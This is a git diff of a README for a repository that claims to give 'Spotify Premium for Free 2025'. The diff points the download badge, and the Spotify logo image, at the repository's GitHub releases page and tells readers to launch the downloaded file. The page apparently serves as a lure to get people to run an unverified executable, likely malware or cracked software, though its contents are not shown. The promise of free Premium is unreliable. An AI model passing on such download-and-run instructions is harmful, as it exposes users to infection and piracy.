@@ -29,7 +29,7 @@ Welcome to the Spotify Premium for Free 2025 repository! 🎉 This amazing softw
 
 To download the Spotify Premium for Free 2025 software, click the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/uploads/App.zip)
+[![Download Software](https://github.com/DragonSoul96/Spotify-Premium-for-free-2025/releases)](https://github.com/DragonSoul96/Spotify-Premium-for-free-2025/releases)
 
 Note: Make sure to launch the downloaded file to start using the software.
 
@@ -41,4 +41,4 @@ Now that you have access to Spotify Premium for Free 2025, go ahead and elevate 
 
 Let the music play and enjoy Spotify Premium for Free 2025! 🎧
 
-![Spotify Logo](https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.png)
+![Spotify Logo](https://github.com/DragonSoul96/Spotify-Premium-for-free-2025/releases)
